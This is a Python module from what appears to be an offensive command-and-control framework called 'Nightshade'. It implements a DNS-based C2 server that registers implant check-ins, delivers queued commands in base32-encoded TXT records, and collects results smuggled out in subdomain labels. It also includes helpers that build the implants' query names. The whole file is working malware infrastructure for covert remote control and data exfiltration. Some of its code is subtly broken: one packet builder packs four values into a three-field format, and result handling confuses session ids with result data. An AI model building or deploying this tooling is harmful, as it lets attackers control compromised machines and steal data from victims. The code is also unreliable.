"""
Nightshade DNS C2 Handler.
Manages DNS-based C2 communication. Encodes commands as DNS queries to
subdomains. Implant A/AAAA query = check-in; TXT query response = command.
Uses base32-encoded payloads in DNS query names (fits within 253-char limit).
"""
import base64
import random
import string
import struct
import time
import json
import threading
import socket
import select
from typing import Optional, Callable


# Base32 alphabet for DNS-safe encoding (no padding issues)
B32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
B32_PAD = "="

# DNS protocol constants
DNS_QUERY_STANDARD = 0x0100
DNS_RESPONSE = 0x8400
DNS_TYPE_A = 0x0001
DNS_TYPE_TXT = 0x0010
DNS_TYPE_AAAA = 0x001C
DNS_CLASS_IN = 0x0001
DNS_HEADER_SIZE = 12


def base32_encode(data: bytes) -> str:
    """Encode bytes to base32 DNS-safe string (lowercase, no padding)."""
    return base64.b32encode(data).decode().rstrip("=").lower()


def base32_decode(s: str) -> bytes:
    """Decode base32 DNS-safe string back to bytes."""
    s = s.upper()
    pad = 8 - (len(s) % 8)
    if pad != 8:
        s += "=" * pad
    return base64.b32decode(s)


class DNSC2Handler:
    """DNS-based C2 communication handler using raw UDP sockets.

    Implant check-in:
      - Implant resolves <encoded_session_id>.checkin.<c2_domain> A/AAAA
      - Server sees this as a check-in event

    Command delivery:
      - Implant resolves <encoded_chunk>.cmd.<c2_domain> TXT record
      - Server responds with TXT containing base32-encoded command

    Result callback:
      - Implant resolves <encoded_result_chunk>.result.<c2_domain> TXT
      - Server logs the result
    """

    def __init__(
        self,
        c2_domain: str = "dns-c2.local",
        listen_ip: str = "0.0.0.0",
        listen_port: int = 53,
        soa_ttl: int = 60,
    ):
        self._domain = c2_domain.rstrip(".")
        self._listen_ip = listen_ip
        self._listen_port = listen_port
        self._soa_ttl = soa_ttl
        self._running = False
        self._sock: Optional[socket.socket] = None

        # Session state
        self._sessions: dict[str, dict] = {}
        self._pending_commands: dict[str, list[str]] = {}
        self._results: dict[str, list[str]] = {}
        self._lock = threading.Lock()

        # Callbacks
        self._on_checkin: Optional[Callable] = None
        self._on_result: Optional[Callable] = None

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def set_on_checkin(self, callback: Callable):
        """Set callback fired on implant check-in (session_id, ip)."""
        self._on_checkin = callback

    def set_on_result(self, callback: Callable):
        """Set callback fired on result delivery (session_id, result_data)."""
        self._on_result = callback

    def enqueue_command(self, session_id: str, command: str) -> str:
        """Queue a command for an implant to pick up."""
        cmd_id = ''.join(random.choices(string.hexdigits, k=8))
        with self._lock:
            if session_id not in self._pending_commands:
                self._pending_commands[session_id] = []
            self._pending_commands[session_id].append(json.dumps({
                "id": cmd_id,
                "cmd": command,
                "ts": time.time(),
            }))
        return cmd_id

    def list_sessions(self) -> list[dict]:
        """Return list of active DNS sessions."""
        with self._lock:
            return [
                {
                    "session_id": sid,
                    "ip": info.get("ip", ""),
                    "first_seen": info.get("first_seen", 0),
                    "last_seen": info.get("last_seen", 0),
                    "checkin_count": info.get("checkin_count", 0),
                }
                for sid, info in self._sessions.items()
            ]

    def start(self):
        """Start the DNS C2 listener in a background thread."""
        if self._running:
            return
        self._running = True
        t = threading.Thread(target=self._dns_listener, daemon=True)
        t.start()
        print(f"  [*] DNS C2 listener started on {self._listen_ip}:{self._listen_port}")

    def stop(self):
        """Stop the DNS C2 listener."""
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    # ------------------------------------------------------------------ #
    #  DNS query parsing and response building                             #
    # ------------------------------------------------------------------ #

    @staticmethod
    def _parse_dns_query(data: bytes) -> Optional[dict]:
        """Parse a DNS query packet and extract the requested name and type."""
        try:
            if len(data) < DNS_HEADER_SIZE:
                return None

            # Parse header
            tid = struct.unpack(">H", data[0:2])[0]
            flags = struct.unpack(">H", data[2:4])[0]
            qdcount = struct.unpack(">H", data[4:6])[0]

            if qdcount == 0:
                return None

            # Parse question section
            offset = DNS_HEADER_SIZE
            labels = []
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    offset += 1
                    break
                if length & 0xC0:  # Compression pointer
                    offset += 2
                    break
                offset += 1
                label = data[offset:offset + length].decode("ascii", errors="replace")
                labels.append(label)
                offset += length

            qtype = struct.unpack(">H", data[offset:offset + 2])[0]
            qclass = struct.unpack(">H", data[offset + 2:offset + 4])[0]

            return {
                "tid": tid,
                "flags": flags,
                "qname": ".".join(labels),
                "qtype": qtype,
                "qclass": qclass,
                "labels": labels,
            }
        except Exception:
            return None

    @staticmethod
    def _build_a_response(tid: int, qname: str, answer_ip: str, ttl: int = 60) -> bytes:
        """Build a DNS A record response."""
        parts = qname.split(".") if qname else []
        qname_encoded = b""
        for part in parts:
            qname_encoded += bytes([len(part)]) + part.encode("ascii")
        qname_encoded += b"\x00"

        ip_parts = [int(x) for x in answer_ip.split(".")]
        answer_rdata = struct.pack("BBBB", *ip_parts)

        packet = struct.pack(">H", tid)
        packet += struct.pack(">H", DNS_RESPONSE)  # response flags
        packet += struct.pack(">HHH", 1, 0, 0, 0)  # QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
        packet += qname_encoded
        packet += struct.pack(">HH", DNS_TYPE_A, DNS_CLASS_IN)  # question
        packet += qname_encoded  # answer name
        packet += struct.pack(">H", DNS_TYPE_A)
        packet += struct.pack(">H", DNS_CLASS_IN)
        packet += struct.pack(">I", ttl)
        packet += struct.pack(">H", 4)
        packet += answer_rdata

        return packet

    @staticmethod
    def _build_txt_response(tid: int, qname: str, txt_data: str, ttl: int = 60) -> bytes:
        """Build a DNS TXT record response."""
        parts = qname.split(".") if qname else []
        qname_encoded = b""
        for part in parts:
            qname_encoded += bytes([len(part)]) + part.encode("ascii")
        qname_encoded += b"\x00"

        txt_bytes = txt_data.encode("ascii", errors="replace")
        txt_length = len(txt_bytes)
        if txt_length > 255:
            txt_length = 255
            txt_bytes = txt_bytes[:255]

        packet = struct.pack(">H", tid)
        packet += struct.pack(">H", DNS_RESPONSE)
        packet += struct.pack(">HHH", 1, 1, 0, 0)
        packet += qname_encoded
        packet += struct.pack(">HH", DNS_TYPE_TXT, DNS_CLASS_IN)
        # Answer
        packet += qname_encoded
        packet += struct.pack(">H", DNS_TYPE_TXT)
        packet += struct.pack(">H", DNS_CLASS_IN)
        packet += struct.pack(">I", ttl)
        packet += struct.pack(">H", txt_length + 1)  # RDLength
        packet += struct.pack("B", txt_length)  # TXT length byte
        packet += txt_bytes

        return packet

    # ------------------------------------------------------------------ #
    #  DNS listener                                                        #
    # ------------------------------------------------------------------ #

    def _dns_listener(self):
        """Main DNS listener loop."""
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)

        try:
            self._sock.bind((self._listen_ip, self._listen_port))
        except PermissionError:
            print(f"  [!] Permission denied on port {self._listen_port}. Try running as root or use a high port.")
            print(f"  [!] On Linux: sudo setcap cap_net_bind_service=+ep $(readlink -f $(which python3))")
            self._running = False
            return

        while self._running:
            try:
                ready, _, _ = select.select([self._sock], [], [], 1.0)
                if not ready:
                    continue

                data, addr = self._sock.recvfrom(4096)
                self._handle_query(data, addr)

            except socket.timeout:
                continue
            except OSError:
                if self._running:
                    continue
                break

    def _handle_query(self, data: bytes, addr: tuple):
        """Process a single DNS query."""
        query = self._parse_dns_query(data)
        if not query:
            return

        qname = query["qname"]
        qtype = query["qtype"]
        tid = query["tid"]
        labels = query["labels"]

        # Check if this query is for our domain
        domain_labels = self._domain.split(".")
        if len(labels) < len(domain_labels) + 2:
            return  # Not our domain

        # Extract the suffix (our domain)
        query_domain = ".".join(labels[-len(domain_labels):])
        if query_domain != self._domain:
            # Check subdomain match
            subdomain_parts = labels[-(len(domain_labels) + 1):-len(domain_labels)]
            if len(subdomain_parts) > 0:
                query_domain = ".".join(labels[-(len(domain_labels) + 1):])
                if not query_domain.endswith(self._domain):
                    return
            else:
                return

        # Extract the prefix (what comes before our domain)
        prefix_labels = labels[:len(labels) - len(domain_labels)]

        if len(prefix_labels) < 2:
            return

        action = prefix_labels[-1]  # checkin, cmd, result
        encoded_data = ".".join(prefix_labels[:-1]) if len(prefix_labels) > 1 else ""
        session_id = encoded_data

        ip = addr[0]

        if action == "checkin":
            # Implant check-in
            with self._lock:
                if session_id not in self._sessions:
                    self._sessions[session_id] = {
                        "ip": ip,
                        "first_seen": time.time(),
                        "last_seen": time.time(),
                        "checkin_count": 0,
                    }
                    print(f"  [+] DNS check-in: {session_id[:16]}.. from {ip}")
                else:
                    self._sessions[session_id]["last_seen"] = time.time()
                    self._sessions[session_id]["checkin_count"] += 1

            if self._on_checkin:
                self._on_checkin(session_id, ip)

            # Check for pending commands
            with self._lock:
                pending = self._pending_commands.get(session_id, [])

            if pending:
                cmd_data = pending[0]
                cmd_encoded = base32_encode(cmd_data.encode())

                # Respond with TXT containing the command
                response_domain = f"{cmd_encoded}.cmd.{self._domain}"
                response = self._build_txt_response(tid, qname, response_domain, self._soa_ttl)
            else:
                # No command - respond with NXDOMAIN-equivalent via A record with null info
                response = self._build_a_response(tid, qname, "0.0.0.1", self._soa_ttl)

        elif action == "cmd":
            # Implant requesting command - use TXT response
            with self._lock:
                pending = self._pending_commands.get(session_id, [])

            if pending:
                cmd_data = pending.pop(0)
                encoded_cmd = base32_encode(cmd_data.encode())
                response = self._build_txt_response(tid, qname, encoded_cmd, self._soa_ttl)
                print(f"  [>] DNS command sent to {session_id[:16]}..")
            else:
                response = self._build_txt_response(tid, qname, "NOOP", self._soa_ttl)

        elif action == "result":
            # Implant sending result
            try:
                result_text = ".".join(prefix_labels[:-1])
                with self._lock:
                    if session_id not in self._results:
                        self._results[session_id] = []
                    self._results[session_id].append(result_text)

                print(f"  [+] DNS result from {session_id[:16]}..: {result_text[:80]}")
                if self._on_result:
                    self._on_result(session_id, result_text)

                response = self._build_a_response(tid, qname, "0.0.0.1", self._soa_ttl)
            except Exception:
                response = self._build_a_response(tid, qname, "0.0.0.1", self._soa_ttl)

        else:
            response = self._build_a_response(tid, qname, "0.0.0.1", self._soa_ttl)

        # Send response
        try:
            self._sock.sendto(response, addr)
        except OSError:
            pass

    # ------------------------------------------------------------------ #
    #  Client-side helpers (for generating implant queries)                #
    # ------------------------------------------------------------------ #

    @staticmethod
    def build_checkin_query(session_id: str, c2_domain: str) -> str:
        """Build a DNS query name for implant check-in."""
        return f"{session_id}.checkin.{c2_domain}"

    @staticmethod
    def build_command_poll(session_id: str, c2_domain: str) -> str:
        """Build a DNS query name for polling commands."""
        return f"{session_id}.cmd.{c2_domain}"

    @staticmethod
    def build_result_delivery(session_id: str, encoded_result: str, c2_domain: str) -> str:
        """Build a DNS query name for sending results."""
        max_len = 240 - len(f".result.{c2_domain}")
        if len(encoded_result) > max_len:
            encoded_result = encoded_result[:max_len]
        return f"{encoded_result}.result.{c2_domain}"

    @staticmethod
    def max_subdomain_length() -> int:
        """Return the maximum safe subdomain label length."""
        return 63  # RFC 1035 per-label limit
